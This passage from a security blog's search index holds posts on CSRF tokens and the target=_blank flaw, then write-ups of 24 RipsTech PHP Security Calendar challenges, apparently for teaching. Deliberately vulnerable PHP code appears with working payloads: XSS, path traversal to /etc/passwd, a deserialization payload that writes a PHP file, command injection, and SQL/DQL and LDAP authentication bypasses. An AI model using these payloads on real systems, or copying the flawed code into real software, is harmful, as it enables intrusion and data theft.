sensitive function should include a single-use authentication token. Such tokens are normally included on each page in a hidden form field, which would be included in the request when the form is submitted. The server keeps a copy of the token valid for the user’s session, and checks if the two values match after receiving the request. The tokens often consist of twenty or more random characters, an example of which is given below.8D086769FC4B3B058F7FCB0BB37645BA77444AFAFurther Information  https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"
  },
  
  {
    "title": "The target=\"_blank\" Vulnerability",
    "url": "/posts/target_blank_vulnerability/",
    "categories": "web application security",
    "tags": "taget blank vuln",
    "date": "2018-04-27 03:25:52 +0800",
    





    
    "snippet": "The HTML &lt;a&gt; element, also known as anchor element is used within webpages to create an hyperlink to another resource. The anchor tag can also be specified with several attributes, one of the...",
    "content": "The HTML &lt;a&gt; element, also known as anchor element is used within webpages to create an hyperlink to another resource. The anchor tag can also be specified with several attributes, one of them being the target attribute. An example can be seen below. Usage of certain attributes can often introduce vulnerabilities in a web application.Example Link:Click HereThe target attribute specifies the context in where the linked resource will open when the it is clicked by a user. The target attribute supports many values such as _blank, _parent and _top. The most interesting of these values is the “_blank” value. If the target attribute is used with the “_blank” value, the resource used as link will open in a new tab, or a new window in older browsers.However, it was discovered a while back that a link opened via target blank attribute can make changes to the original page, essentially bypassing same origin policy restrictions. An example of this are as follows.Click Here for a POCClicking the above link will take you to a webpage with the following JavaScript code:&lt;script&gt;window.opener.location = 'https://media.makeameme.org/created/hacked.jpg';&lt;/script&gt;In the above code, the window.opener.location property is used to redirect a user from the initial clicked webpage to an attacker controlled webpage. This could be leveraged to conduct phishing attacks on the initial webpage since the window.opener object has access to the page from where the user clicked the link. However, it should be noted that it is not possible to execute JavaScript on the initial page since the window.opener object only has partial access (TLDR: you can only control the location attribute of the window object so only redirection is possible).To make detection of this vulnerability easier, I wrote a Burp Plugin which can be found here: https://github.com/snoopysecurity/Noopener-Burp-ExtensionThe following article also shows a real-world example of this vulnerability: https://dev.to/ben/the-targetblank-vulnerability-by-exampleTo prevent pages from abusing this vulnerability, the “noopener” and “noreferrer” attribute can be used. An example of this is shown below:&lt;a href=\"http://snoopysecurity.github.io\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;Click Me&lt;/a&gt;For older browsers, The “noreferrer” attribute will need to be used since certain browsers such as Firefox doesn’t support the “noopener” attribute.References:  https://mathiasbynens.github.io/rel-noopener/"
  },
  
  {
    "title": "RipsTech PHP Security Calendar 2017 Notes",
    "url": "/posts/ripstech_2017_security_calendar/",
    "categories": "capture the flag",
    "tags": "ctf",
    "date": "2018-03-24 03:25:52 +0800",
    





    
    "snippet": "Notes related to RipsTech PHP Security Calendar 2017 which aren’t accessible anymore.Challenge 1 - Wishlistclass Challenge {    const UPLOAD_DIRECTORY = './solutions/';    private $file;    private...",
    "content": "Notes related to RipsTech PHP Security Calendar 2017 which aren’t accessible anymore.Challenge 1 - Wishlistclass Challenge {    const UPLOAD_DIRECTORY = './solutions/';    private $file;    private $whitelist;    public function __construct($file) {        $this-&gt;file = $file;        $this-&gt;whitelist = range(1, 24);    }    public function __destruct() {        if (in_array($this-&gt;file['name'], $this-&gt;whitelist)) {            move_uploaded_file(                $this-&gt;file['tmp_name'],                self::UPLOAD_DIRECTORY . $this-&gt;file['name']            );        }    }}$challenge = new Challenge($_FILES['solution']);  The vulnerability allows arbitrary file uploads, identified at line 13.  At line 12, in_array() is used to verify if the file name matches a number.  However, this check is not type-safe because the third parameter in in_array() is not set to true.  As a result, PHP will type-cast the file name to an integer when comparing it to the $whitelist array at line 8.  This allows bypassing the whitelist by prepending a number between 1 and 24 to the file name, such as “5backdoor.php”.  Successfully uploading this PHP file could lead to code execution on the server.Challenge 2 - Twig// composer require \"twig/twig\"require 'vendor/autoload.php';class Template {    private $twig;    public function __construct() {        $indexTemplate = '&lt;img ' .            'src=\"https://loremflickr.com/320/240\"&gt;' .            '&lt;a href=\"\"&gt;Next slide »&lt;/a&gt;';        // Default twig setup, simulate loading        // index.html file from disk        $loader = new Twig\\Loader\\ArrayLoader([            'index.html' =&gt; $indexTemplate        ]);        $this-&gt;twig = new Twig\\Environment($loader);    }    public function getNexSlideUrl() {        $nextSlide = $_GET['nextSlide'];        return filter_var($nextSlide, FILTER_VALIDATE_URL);    }    public function render() {        echo $this-&gt;twig-&gt;render(            'index.html',            ['link' =&gt; $this-&gt;getNexSlideUrl()]        );    }}(new Template())-&gt;render();  A cross-site scripting (XSS) vulnerability exists at line 26.  Two filters aim to ensure the link passed to the  tag is a legitimate URL:  filter_var() at line 22 checks for a valid URL.  Twig’s template escaping at line 10 helps prevent breaking out of the href attribute.  The vulnerability is still exploitable using a crafted URL like: ?nextSlide=javascript://comment%250aalert(1).  This payload contains no markup characters that Twig’s escaping would filter out and is also considered a valid URL by filter_var().  The payload uses a JavaScript protocol handler with a comment (//), followed by the JavaScript payload on a new line.  When the link is clicked, the JavaScript code executes in the victim’s browser.Challenge 3 - Snowflakefunction __autoload($className) {    include $className;}$controllerName = $_GET['c'];$data = $_GET['d'];if (class_exists($controllerName)) {    $controller = new $controllerName($data['t'], $data['v']);    $controller-&gt;render();} else {    echo 'There is no page with this name';}class HomeController {    private $template;    private $variables;    public function __construct($template, $variables) {        $this-&gt;template = $template;        $this-&gt;variables = $variables;    }    public function render() {        if ($this-&gt;variables['new']) {            echo 'controller rendering new response';        } else {            echo 'controller rendering old response';        }    }}This code contains two security vulnerabilities:  File Inclusion Vulnerability  Triggered by the class_exists() call at line 8, which checks for the existence of a user-supplied class name.  This call invokes the custom autoloader at line 1 when the class name is unknown, leading to an attempt to include unknown classes.  An attacker can exploit this with a path traversal attack, for instance, by providing ../../../../etc/passwd as the class name to leak the system’s passwd file.  This vulnerability affects PHP versions up to 5.3.  Arbitrary Object Instantiation  At line 9, the user-controlled class name is used to instantiate a new object, with the first argument of its constructor also under the attacker’s control.  This enables the invocation of arbitrary constructors within the PHP codebase.  Even if the code does not have a vulnerable constructor, PHP’s built-in SimpleXMLElement class can be used to initiate an XXE attack, potentially exposing sensitive files.Example real world case: shopware-php-object-instantiation-to-blind-xxe### Challenge 4 - False Beard class Login {    public function __construct($user, $pass) {        $this-&gt;loginViaXml($user, $pass);    }    public function loginViaXml($user, $pass) {        if (            (!strpos($user, '&lt;') || !strpos($user, '&gt;')) &amp;&amp;            (!strpos($pass, '&lt;') || !strpos($pass, '&gt;'))        ) {            $format = '&lt;?xml version=\"1.0\"?&gt;' .                      '&lt;user v=\"%s\"/&gt;&lt;pass v=\"%s\"/&gt;';            $xml = sprintf($format, $user, $pass);            $xmlElement = new SimpleXMLElement($xml);            // Perform the actual login.            $this-&gt;login($xmlElement);        }    }}new Login($_POST['username'], $_POST['password']);  An XML injection vulnerability exists at line 14, allowing an attacker to manipulate the XML structure and bypass authentication.  Lines 8 and 9 attempt to prevent exploitation by checking for angle brackets, but this check can be bypassed with a carefully crafted payload.  The vulnerability is due to PHP’s automatic type-casting:  The strpos() function returns the numeric position of the searched character, which can be 0 if the first character matches.  This 0 value is then type-cast to boolean false in the if comparison, causing the condition to evaluate as true.  A sample payload might look like: user=&lt;\"&gt;&lt;injected-tag%20property=\"&amp;pass;=&lt;injected-tag&gt;.Challenge 5 - Postcardclass Mailer {    private function sanitize($email) {        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {            return '';        }        return escapeshellarg($email);    }    public function send($data) {        if (!isset($data['to'])) {            $data['to'] = 'none@ripstech.com';        } else {            $data['to'] = $this-&gt;sanitize($data['to']);        }        if (!isset($data['from'])) {            $data['from'] = 'none@ripstech.com';        } else {            $data['from'] = $this-&gt;sanitize($data['from']);        }        if (!isset($data['subject'])) {            $data['subject'] = 'No Subject';        }        if (!isset($data['message'])) {            $data['message'] = '';        }        mail($data['to'], $data['subject'], $data['message'],             '', \"-f\" . $data['from']);    }}$mailer = new Mailer();$mailer-&gt;send($_POST);  A command execution vulnerability exists at line 31, where the $_POST[‘from’] variable is appended as the fifth parameter in the mail() function, allowing it to modify the sendmail command.  Although arbitrary commands cannot be executed, an attacker can append new parameters to sendmail, potentially creating a PHP backdoor via sendmail log files.  Insufficient Protections Against Exploitation - Two protections aim to prevent this exploit, but they are inadequate:  The sanitize() function first checks if the email address is valid at line 3. However, the filter does not block all characters required for exploiting the mail() function, allowing escaped whitespaces within double quotes.  At line 7, escapeshellarg() sanitizes the email address, which would normally suffice. However, PHP’s internal escape of the fifth parameter with escapeshellcmd() allows the attacker to bypass escapeshellarg() by escaping out of it.Challenge 6 - Frost Patternclass TokenStorage {    public function performAction($action, $data) {        switch ($action) {            case 'create':                $this-&gt;createToken($data);                break;            case 'delete':                $this-&gt;clearToken($data);                break;            default:                throw new Exception('Unknown action');        }    }    public function createToken($seed) {        $token = md5($seed);        file_put_contents('/tmp/tokens/' . $token, '...data');    }    public function clearToken($token) {        $file = preg_replace(\"/[^a-z.-_]/\", \"\", $token);        unlink('/tmp/tokens/' . $file);    }}$storage = new TokenStorage();$storage-&gt;performAction($_GET['action'], $_GET['data']);  A file delete vulnerability exists in this code.  The issue is caused by an unescaped hyphen (-) in the regular expression used in the preg_replace() call at line 21.  Without escaping, the hyphen acts as a range indicator, replacing any character not in a-z or within the ASCII range from dot (46) to underscore (95).  This allows directory traversal using . and /, enabling an attacker to delete (almost) arbitrary files.  For example, the parameters action=delete&amp;data=../../config.php could delete the config.php file.Challenge 7 - Bellsfunction getUser($id) {    global $config, $db;    if (!is_resource($db)) {        $db = new MySQLi(            $config['dbhost'],            $config['dbuser'],            $config['dbpass'],            $config['dbname']        );    }    $sql = \"SELECT username FROM users WHERE id = ?\";    $stmt = $db-&gt;prepare($sql);    $stmt-&gt;bind_param('i', $id);    $stmt-&gt;bind_result($name);    $stmt-&gt;execute();    $stmt-&gt;fetch();    return $name;}$var = parse_url($_SERVER['HTTP_REFERER']);parse_str($var['query']);$currentUser = getUser($id);echo '&lt;h1&gt;'.htmlspecialchars($currentUser).'&lt;/h1&gt;';  A connection string injection vulnerability exists at line 4.  This issue arises from the parse_str() call at line 21, which behaves similarly to register_globals.  The parse_str() function extracts query parameters from the referrer as variables in the current scope, allowing control over the global $config variable within getUser() (lines 5–8).  This vulnerability allows an attacker to connect to a malicious MySQL server and return arbitrary values for the username.For example, using a referrer like http://host/?config[dbhost]=10.0.0.5&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=malicious&amp;id=1 enables this attack.Challenge 8 - Candleheader(\"Content-Type: text/plain\");function complexStrtolower($regex, $value) {    return preg_replace(        '/(' . $regex . ')/ei',        'strtolower(\"\\\\1\")',        $value    );}foreach ($_GET as $regex =&gt; $value) {    echo complexStrtolower($regex, $value) . \"\\n\";  A code injection vulnerability is present at line 4 due to the behavior of preg_replace() in versions of PHP prior to 7.  In these versions, preg_replace() includes an eval modifier (e), which treats the replacement (second parameter) as PHP code if enabled.  Although direct injection into the second parameter isn’t possible, the \\\\1 placeholder (representing the matched expression) can be controlled.  While it’s not possible to escape the strtolower() function call, the matched value is within double quotes, allowing the use of PHP’s curly syntax for injecting additional function calls.  An example attack payload could look like: /?=.*={${phpinfo()}}, enabling execution of phpinfo().Challenge 9 - Rabbitclass LanguageManager{    public function loadLanguage()    {        $lang = $this-&gt;getBrowserLanguage();        $sanitizedLang = $this-&gt;sanitizeLanguage($lang);        require_once(\"/lang/$sanitizedLang\");    }    private function getBrowserLanguage()    {        $lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en';        return $lang;    }    private function sanitizeLanguage($language)    {        return str_replace('../', '', $language);    }}(new LanguageManager())-&gt;loadLanguage();  A file inclusion vulnerability exists, which could allow an attacker to execute arbitrary code or leak sensitive files on the server.  The issue is found in the sanitization function at line 18, where the ../ string is replaced but not recursively.  This failure allows an attacker to use alternate sequences like ....// or ..././, which will still resolve to ../ after replacement.  As a result, the attacker can perform path traversal and manipulate the path to the included language file.  For example, the system’s passwd file can be leaked by setting the following payload in the Accept-Language HTTP request header: .//....//....//etc/passwd.Challenge 10 - Anticipationextract($_POST);function goAway() {    error_log(\"Hacking attempt.\");    header('Location: /error/');}if (!isset($pi) || !is_numeric($pi)) {    goAway();}if (!assert(\"(int)$pi == 3\")) {    echo \"This is not pi.\";} else {    echo \"This might be pi.\";}  A code injection vulnerability exists at line 12, allowing an attacker to execute arbitrary PHP code on the web server.  The assert() function evaluates PHP code and contains user input, creating the potential for malicious code execution.  At line 1, PHP’s built-in extract() function instantiates all POST parameters as global variables, which can lead to security issues by exposing input directly as variables.  In this challenge, the vulnerability allows the attacker to set the $pi variable directly via a POST parameter.  At line 8, there is a check to ensure the input is numeric. If not, the user is redirected to an error page via the goAway() function.  However, after the redirect in line 5, the script continues execution because there is no exit() call, allowing the attacker to inject and execute PHP code in the $pi parameter.  For example, setting pi=phpinfo() will cause the phpinfo() function to execute.Challenge 11 - Pumpkin Pieclass Template {    public $cacheFile = '/tmp/cachefile';    public $template = '&lt;div&gt;Welcome back %s&lt;/div&gt;';    public function __construct($data = null) {        $data = $this-&gt;loadData($data);        $this-&gt;render($data);    }    public function loadData($data) {        if (substr($data, 0, 2) !== 'O:'        &amp;&amp; !preg_match('/O:\\d:\\/', $data)) {            return unserialize($data);        }        return [];    }    public function createCache($file = null, $tpl = null) {        $file = $file ?? $this-&gt;cacheFile;        $tpl = $tpl ?? $this-&gt;template;        file_put_contents($file, $tpl);    }    public function render($data) {        echo sprintf(            $this-&gt;template,            htmlspecialchars($data['name'])        );    }    public function __destruct() {        $this-&gt;createCache();    }}new Template($_COOKIE['data']);      This challenge contains a PHP object injection vulnerability, found at line 13, where an attacker can pass user input into the unserialize() function by modifying their cookie data.    There are two checks at lines 11 and 12 to prevent object deserialization:          The first check can be easily bypassed by injecting an object into an array, resulting in a payload string that begins with a:1: instead of O:.      The second check can be bypassed by exploiting PHP’s flexible serialization syntax, using O:+1: to bypass the regex check.            This allows the attacker to inject an object of class Template into the application.        After the serialized object is deserialized and the Template object is instantiated, its destructor is triggered when the script terminates (line 31).        The attacker-controlled properties, cacheFile and template, are used in line 21 to write to a file, enabling the creation of arbitrary files on the system.        For example, an attacker can create a PHP shell in the document root with the payload:a:1:{i:0;O:%2b8:\"Template\":2:{s:9:\"cacheFile\";s:14:\"/var/www/a.php\";s:8:\"template\";s:16:\"&lt;?php%20phpinfo();\";}}    More information about this attack can be found in this blog post.Challenge 12 - String Lights$sanitized = [];foreach ($_GET as $key =&gt; $value) {    $sanitized[$key] = intval($value);}$queryParts = array_map(function ($key, $value) {    return $key . '=' . $value;}, array_keys($sanitized), array_values($sanitized));$query = implode('&amp;', $queryParts);echo \"&lt;a href='/images/size.php?\" .    htmlentities($query) . \"'&gt;link&lt;/a&gt;\";      This challenge contains a cross-site scripting (XSS) vulnerability, found at line 13.        The issue arises from the insufficient sanitization of the keys in the $_GET array (the GET parameter names).        Both the keys and sanitized GET values are concatenated into the href attribute of the &lt;a&gt; tag.        The htmlentities() function is used to sanitize the input, but it does not affect single quotes by default.        As a result, an attacker can exploit this by injecting an XSS payload into the parameter name, which breaks the href attribute and appends a JavaScript event handler.        For example, the following query parameter can be used:/a'onclick%3dalert(1)%2f%2f=c        The payload is placed in the parameter name, not the parameter value, allowing the attacker to execute JavaScript in the user’s browser.  Challenge 13 - Turkey Blasterclass LoginManager {    private $em;    private $user;    private $password;    public function __construct($user, $password) {        $this-&gt;em = DoctrineManager::getEntityManager();        $this-&gt;user = $user;        $this-&gt;password = $password;    }    public function isValid() {        $user = $this-&gt;sanitizeInput($this-&gt;user);        $pass = $this-&gt;sanitizeInput($this-&gt;password);                $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()            -&gt;select(\"COUNT(p)\")            -&gt;from(\"User\", \"u\")            -&gt;where(\"user = '$user' AND password = '$pass'\");        $query = $queryBuilder-&gt;getQuery();        return boolval($query-&gt;getSingleScalarResult());    }\t    public function sanitizeInput($input, $length = 20) {        $input = addslashes($input);        if (strlen($input) &gt; $length) {            $input = substr($input, 0, $length);        }        return $input;    }}$auth = new LoginManager($_POST['user'], $_POST['passwd']);if (!$auth-&gt;isValid()) {    exit;}      Today’s challenge contains a Doctrine Query Language (DQL) injection vulnerability, located in line 19.        DQL injection is similar to SQL injection but more limited. In this case, the where() method of Doctrine is vulnerable.        In lines 13 and 14, sanitization is applied to the input, but the sanitizeInput() method contains a bug.        The method uses addslashes() to escape relevant characters by adding a backslash (\\) in front of them. However, this causes an issue when a backslash (\\) is passed as input, as it gets escaped to \\\\.        The substr() function is then used to truncate the string, which can result in an escaped backslash being cut off, leaving a single backslash (\\) at the end of the string.        This improperly escaped input can break the WHERE statement and allow an attacker to inject custom DQL syntax. For example, using the condition OR 1=1, which always evaluates to true, can bypass authentication:user=1234567890123456789\\&amp;passwd;=%20OR%201=1-        The resulting DQL query becomes:user = '1234567890123456789\\' AND password = ' OR 1=1-'        The backslash confuses the quotes, enabling DQL injection into the password value.        The resulting query is technically invalid due to the trailing slash, but Doctrine automatically closes the last single quote, resulting in the final query:OR 1=1-''        To prevent DQL injections, always use bound parameters for dynamic conditions and avoid using addslashes() or similar functions to secure queries.        Additionally, store passwords in a hashed format (e.g., BCrypt) in the database.  Challenge 14 - Snowmanclass Carrot {    const EXTERNAL_DIRECTORY = '/tmp/';    private $id;    private $lost = 0;    private $bought = 0;    public function __construct($input) {        $this-&gt;id = rand(1, 1000);        foreach ($input as $field =&gt; $count) {            $this-&gt;$field = $count++;        }    }    public function __destruct() {        file_put_contents(            self::EXTERNAL_DIRECTORY . $this-&gt;id,            var_export(get_object_vars($this), true)        );    }}$carrot = new Carrot($_GET);      This class is vulnerable to directory traversal due to mass assignment.        The constructor (line 11) allows arbitrary class attributes to be set via user input. By overwriting the $id attribute, an attacker can control the first parameter of file_put_contents() in line 16.        By using ../, the attacker can target arbitrary files on the system that are writable, potentially allowing them to create a PHP shell in the document root.        The class assigns and increments values in line 11. However, the incrementation happens after the assignment, meaning the class attribute still holds the original value of $count after the operation.    To prevent this security issue:          Be very cautious when using reflection to set variables based on user input.      Implement a whitelist verification that only allows specific variable names to be modified.        A real-world example of a vulnerability caused by mass assignment can be found here.Challenge 15 - Sleigh Rideclass Redirect {    private $websiteHost = 'www.example.com';    private function setHeaders($url) {        $url = urldecode($url);        header(\"Location: $url\");    }    public function startRedirect($params) {        $parts = explode('/', $_SERVER['PHP_SELF']);        $baseFile = end($parts);        $url = sprintf(            \"%s?%s\",            $baseFile,            http_build_query($params)        );        $this-&gt;setHeaders($url);    }}if ($_GET['redirect']) {    (new Redirect())-&gt;startRedirect($_GET['params']);}This challenge contains an open redirect vulnerability in line 6.The code:  Takes input from the $_SERVER['PHP_SELF'] superglobal.  Splits the input at the slash character (/) on line 10.  Uses the last part to construct a new URL.  Passes the new URL to the header() function.An attacker can exploit this vulnerability by injecting a malicious URL using URL-encoded characters, which are decoded on line 5.A possible payload could look like this: /index.php/http:%252f%252fwww.domain.com?redirect=1Impact:  Phishing Attacks: Redirecting users to malicious sites disguised as the original site.  Credential Theft: Tricking users into entering their credentials on fake login pages.Challenge 16 - Poemclass FTP {    public $sock;    public function __construct($host, $port, $user, $pass) {        $this-&gt;sock = fsockopen($host, $port);        $this-&gt;login($user, $pass);        $this-&gt;cleanInput();        $this-&gt;mode($_REQUEST['mode']);        $this-&gt;send($_FILES['file']);    }    private function cleanInput() {        $_GET = array_map('intval', $_GET);        $_POST = array_map('intval', $_POST);        $_COOKIE = array_map('intval', $_COOKIE);    }    public function login($username, $password) {        fwrite($this-&gt;sock, \"USER \" . $username . \"\\n\");        fwrite($this-&gt;sock, \"PASS \" . $password . \"\\n\");    }    public function mode($mode) {        if ($mode == 1 || $mode == 2 || $mode == 3) {            fputs($this-&gt;sock, \"MODE $mode\\n\");        }    }    public function send($data) {        fputs($this-&gt;sock, $data);    }}new FTP('localhost', 21, 'user', 'password');This challenge presents two vulnerabilities that, when combined, allow for data injection into an open FTP connection.Bug #1: Incomplete Sanitization (Line 9)  The code utilizes $_REQUEST in line 9 to capture user input.  Lines 14-16 sanitize only $_GET and $_POST, neglecting $_COOKIE data.  Crucially, $_REQUEST is a combined copy of these inputs, not a reference.  This incomplete sanitization leaves $_REQUEST vulnerable to malicious content.Real-World Impact:A similar vulnerability in WordPress security is documented on our blog (archived link: https://web.archive.org/web/20171224161253/https://blog.ripstech.com/2016/the-state-of-wordpress-security/#all-in-one-wp-security-firewall).Bug #2: Type Juggling with == (Line 25)  Line 25 employs the type-unsafe comparison operator == instead of the strict comparison ===.  This allows attackers to inject malicious code through type juggling.  Example Payload: ?mode=1%0a%0dDELETE%20test.file          Decoded, the payload injects a “DELETE” command potentially wiping out a file named “test.file”.      Combined Impact:These vulnerabilities enable attackers to:  Inject arbitrary commands into the FTP connection.  Potentially manipulate or steal sensitive data.Challenge 17 - Mistletoeclass RealSecureLoginManager {    private $em;    private $user;    private $password;    public function __construct($user, $password) {        $this-&gt;em = DoctrineManager::getEntityManager();        $this-&gt;user = $user;        $this-&gt;password = $password;    }    public function isValid() {        $pass = md5($this-&gt;password, true);        $user = $this-&gt;sanitizeInput($this-&gt;user);        $queryBuilder = $this-&gt;em-&gt;createQueryBuilder()            -&gt;select(\"COUNT(p)\")            -&gt;from(\"User\", \"u\")            -&gt;where(\"password = '$pass' AND user = '$user'\");        $query = $queryBuilder-&gt;getQuery();        return boolval($query-&gt;getSingleScalarResult());    }    public function sanitizeInput($input) {        return addslashes($input);    }}$auth = new RealSecureLoginManager(    $_POST['user'],    $_POST['passwd']);if (!$auth-&gt;isValid()) {    exit;}  The challenge is intended to be a fixed version of Day 13 but inadvertently introduces new security flaws.  The author attempted to address the DQL injection by using addslashes() on the username but forgot to use substr().  The password was hashed using md5() on line 13, which is not recommended for secure password storage.          md5() is not secure for password hashing and should be avoided.      Password hashes should not be directly compared.      The second parameter for md5() is set to true, returning the hash in binary format, which can contain ASCII characters.        When the hash is binary, Doctrine may misinterpret certain characters, leading to potential issues.          In this case, an attacker could use 128 as the password, resulting in a hash like v�an���l���q��\\, where the backslash escapes a single quote, enabling a DQL injection.      A potential attack could use this payload: ?user=%20OR%201=1-&amp;passwd;=128.        To prevent DQL injections, always use bound parameters for dynamic conditions in queries.  Never attempt to “secure” a DQL query with addslashes() or similar functions.  Passwords should be hashed using a secure algorithm, such as BCrypt, rather than insecure methods like md5().Challenge 18 - Signclass JWT {    public function verifyToken($data, $signature) {        $pub = openssl_pkey_get_public(\"file://pub_key.pem\");        $signature = base64_decode($signature);        if (openssl_verify($data, $signature, $pub)) {            $object = json_decode(base64_decode($data));            $this-&gt;loginAsUser($object);        }    }}(new JWT())-&gt;verifyToken($_GET['d'], $_GET['s']);  The challenge includes a bug in the use of the openssl_verify() function on line 5, which causes an authentication bypass on line 7.  The openssl_verify() function returns three possible values:          1 if the signature is correct,      0 if the signature verification fails,      -1 if an error occurs during the verification process.        The issue arises when an attacker generates a valid signature using a different algorithm than the one used by pub_key.pem.          In this case, openssl_verify() returns -1, which is automatically cast to true, bypassing the authentication check.        To resolve this, use a type-safe comparison (===) to validate the return value of openssl_verify().  Alternatively, consider using a more secure cryptography library to handle signature verification.Challenge 19 - Birchclass ImageViewer {    private $file;    function __construct($file) {        $this-&gt;file = \"images/$file\";        $this-&gt;createThumbnail();    }    function createThumbnail() {        $e = stripcslashes(            preg_replace(                '/[^0-9\\\\\\]/',                '',                isset($_GET['size']) ? $_GET['size'] : '25'            )        );        system(\"/usr/bin/convert {$this-&gt;file} --resize $e                ./thumbs/{$this-&gt;file}\");    }    function __toString() {        return \"&lt;a href={$this-&gt;file}&gt;                &lt;img src=./thumbs/{$this-&gt;file}&gt;&lt;/a&gt;\";    }}echo (new ImageViewer(\"image.png\"));  The ImageViewer class is vulnerable to remote command execution via the size parameter on line 17.  The preg_replace() function is used to remove most non-digit characters, but this is not enough to prevent exploitation.  The stripcslashes() function not only removes slashes but also converts C literal escape sequences into their actual byte values.          This leaves the backslash character unaffected by preg_replace(), allowing an attacker to inject an octal byte escape sequence like 0\\073\\163\\154\\145\\145\\160\\0405\\073.        The stripcslashes() function will evaluate the input to 0;sleep 5;, which gets appended to the system command and executed by the attacker.Challenge 20 - Stockingset_error_handler(function ($no, $str, $file, $line) {    throw new ErrorException($str, 0, $no, $file, $line);}, E_ALL);class ImageLoader{    public function getResult($uri)    {        if (!filter_var($uri, FILTER_VALIDATE_URL)) {            return '&lt;p&gt;Please enter valid uri&lt;/p&gt;';        }        try {            $image = file_get_contents($uri);            $path = \"./images/\" . uniqid() . '.jpg';            file_put_contents($path, $image);            if (mime_content_type($path) !== 'image/jpeg') {                unlink($path);                return '&lt;p&gt;Only .jpg files allowed&lt;/p&gt;';            }        } catch (Exception $e) {            return '&lt;p&gt;There was an error: ' .                $e-&gt;getMessage() . '&lt;/p&gt;';        }        return '&lt;img src=\"' . $path . '\" width=\"100\"/&gt;';    }}echo (new ImageLoader())-&gt;getResult($_GET['img']);  This challenge contains a server-side request forgery (SSRF) vulnerability that allows an attacker to make requests on behalf of the targeted web server.  This enables the attacker to access servers that would otherwise be unreachable from the outside, such as internal systems behind the web server.          For example, an attacker could use this vulnerability to conduct a port scan or retrieve banners (like server versions) from internal services.        The vulnerability is caused by two factors:          The use of file_get_contents() with unfiltered user input on line 14.      The printing of error messages to the user on line 23.        An attacker could exploit this by providing an internal URI like ?img=http://internal:22, which would return a response such as failed to open stream: HTTP request failed! SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2 if OpenSSH is running.          This kind of information can aid in further attacks.        Another common attack scenario is retrieving sensitive AWS credentials when exploiting an AWS cloud instance.  Additionally, filter_var() accepts file:// URLs, which can allow an attacker to load local files.Challenge 21 - Gift Wrapdeclare(strict_types=1);class ParamExtractor {    private $validIndices = [];    private function indices($input) {        $validate = function (int $value, $key) {            if ($value &gt; 0) {                $this-&gt;validIndices[] = $key;            }        };        try {            array_walk($input, $validate, 0);        } catch (TypeError $error) {            echo \"Only numbers are allowed as input\";        }        return $this-&gt;validIndices;    }    public function getCommand($parameters) {        $indices = $this-&gt;indices($parameters);        $params = [];        foreach ($indices as $index) {            $params[] = $parameters[$index];        }        return implode($params, ' ');    }}$cmd = (new ParamExtractor())-&gt;getCommand($_GET['p']);system('resizeImg image.png ' . $cmd);  This challenge contains a command injection vulnerability on line 33.  The developer enabled strict_types=1 on line 1 to enforce type hints in the validate function (line 7), ensuring that a TypeError is thrown if a non-integer value is passed.  Despite strict typing being enabled, there is a bug in the use of array_walk(), which bypasses strict typing and instead uses PHP’s default weak typing.  As a result, an attacker can append a command to the last parameter, which will be executed in the system call.          A possible exploit could look like ?p[1]=1&amp;p[2]=2;%20ls%20-la.      Challenge 22 - Chimneyif (isset($_POST['password'])) {    setcookie('hash', md5($_POST['password']));    header(\"Refresh: 0\");    exit;}$password = '0e836584205638841937695747769655';if (!isset($_COOKIE['hash'])) {    echo '&lt;form&gt;&lt;input type=\"password\" name=\"password\" /&gt;'       . '&lt;input type=\"submit\" value=\"Login\" &gt;&lt;/form &gt;';    exit;} elseif (md5($_COOKIE['hash']) == $password) {    echo 'Login succeeded';} else {    echo 'Login failed';}  The code snippet has four vulnerabilities:          Type-unsafe comparison: On line 12, the hashed password is compared to a string using a type-unsafe operator. The string is in scientific notation and is interpreted as “zero to the power of X”, which results in zero. If an attacker can generate a zero-string for the hashed user input, the comparison will succeed.                  These hashes are known as “Magic Hashes.” A Google search reveals that the MD5 hash of 240610708 produces the desired properties.                    Hashing issue: The password hash is calculated twice, which prevents directly submitting the value. The second vulnerability arises because the first hash is calculated on the server but stored in a cookie on the client side. The attacker can inject the value 240610708 directly into the password cookie to bypass the check.      Timing attack vulnerability: The comparison of the hashes is vulnerable to timing attacks. To mitigate this, the hash_equals() function should be used for secure comparison.      Weak password hashing: The code uses the MD5 algorithm to hash the password, which is considered broken and not suitable for password storage. A more secure algorithm like BCrypt should be used for hashing passwords.        Additionally, passwords should not be hardcoded in the code but should be stored in a configuration file for better security.Challenge 23 - Cookiesclass LDAPAuthenticator {    public $conn;    public $host;    function __construct($host = \"localhost\") {        $this-&gt;host = $host;    }    function authenticate($user, $pass) {        $result = [];        $this-&gt;conn = ldap_connect($this-&gt;host);            ldap_set_option(            $this-&gt;conn,            LDAP_OPT_PROTOCOL_VERSION,            3        );        if (!@ldap_bind($this-&gt;conn))            return -1;        $user = ldap_escape($user, null, LDAP_ESCAPE_DN);        $pass = ldap_escape($pass, null, LDAP_ESCAPE_DN);        $result = ldap_search(            $this-&gt;conn,            \"\",            \"(&amp;(uid=$user)(userPassword=$pass))\"        );        $result = ldap_get_entries($this-&gt;conn, $result);        return ($result[\"count\"] &gt; 0 ? 1 : 0);    }}if(isset($_GET[\"u\"]) &amp;&amp; isset($_GET[\"p\"])) {    $ldap = new LDAPAuthenticator();    if ($ldap-&gt;authenticate($_GET[\"u\"], $_GET[\"p\"])) {        echo \"You are now logged in!\";    } else {        echo \"Username or password unknown!\";    }}  The LDAPAuthenticator class is vulnerable to an LDAP injection on line 24.  By injecting special characters into the username, an attacker can manipulate the LDAP query’s result set.  Although the ldap_escape() function is used to sanitize input on lines 19 and 20, an incorrect flag is passed to the function, leading to improper sanitization.  As a result, the LDAP injection allows an unauthenticated attacker to bypass the authentication mechanism.          In this case, the attacker can inject the asterisk wildcard * as both the username and password to successfully authenticate as any user.      Challenge 24 - Nutcracker@$GLOBALS=$GLOBALS{next}=next($GLOBALS{'GLOBALS'})[$GLOBALS['next']['next']=next($GLOBALS)['GLOBALS']][$next['GLOBALS']=next($GLOBALS[GLOBALS]['GLOBALS'])[$next['next']]][$next['GLOBALS']=next($next['GLOBALS'])][$GLOBALS[next]['next']($GLOBALS['next']{'GLOBALS'})]=next(neXt(${'next'}['next']));  This challenge involves a code snippet created by one of our team members for 